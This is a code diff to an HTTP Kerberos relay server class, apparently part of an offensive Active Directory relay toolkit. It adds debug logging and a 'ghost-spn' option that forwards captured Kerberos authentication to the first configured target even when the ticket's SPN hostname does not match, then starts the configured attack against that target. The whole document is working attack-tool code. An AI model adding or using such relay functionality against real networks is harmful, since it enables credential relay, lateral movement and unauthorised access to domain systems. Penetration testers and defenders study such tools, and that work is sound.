@@ -179,12 +179,18 @@ class HTTPKrbRelayServer(HTTPRelayServer):
         def do_relay(self, authdata):
             self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
             sclass, host = authdata['service'].split('/')
+            LOG.debug('[RELAY] authUser=%s service=%s', self.authUser, authdata['service'])
             for target in self.server.config.target.originalTargets:
                 parsed_target = target
-                if host.lower() in parsed_target.hostname.lower():
+                LOG.debug('[RELAY] Checking target %s hostname=%s vs SPN host=%s',
+                          parsed_target.scheme, parsed_target.hostname, host)
+                if host.lower() in (parsed_target.hostname or '').lower():
                     # Found a target with the same SPN
+                    LOG.debug('[RELAY] SPN hostname match found')
                     client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
-                    if not client.initConnection(authdata, self.server.config.dcip):
+                    client.initConnection(authdata, self.server.config.dcip)
+                    if not client.session or not client.session.bound:
+                        LOG.error('Relay to %s failed - session not established', parsed_target.netloc.lower())
                         return
                     # We have an attack.. go for it
                     attack = self.server.config.attacks[parsed_target.scheme.upper()]
@@ -192,4 +198,16 @@ class HTTPKrbRelayServer(HTTPRelayServer):
                     client_thread.start()
                     return
             # Still here? Then no target was found matching this SPN
-            LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())
+            if self.server.config.ghostspn and len(self.server.config.target.originalTargets) > 0:
+                LOG.warning('[GHOST-SPN] SPN hostname %s does not match any target, relaying to first target anyway (--ghost-spn)', host.lower())
+                parsed_target = self.server.config.target.originalTargets[0]
+                client = self.server.config.protocolClients[parsed_target.scheme.upper()](self.server.config, parsed_target)
+                client.initConnection(authdata, self.server.config.dcip)
+                if not client.session or not client.session.bound:
+                    LOG.error('Relay to %s failed - session not established', parsed_target.netloc.lower())
+                    return
+                attack = self.server.config.attacks[parsed_target.scheme.upper()]
+                client_thread = attack(self.server.config, client.session, self.authUser)
+                client_thread.start()
+            else:
+                LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())
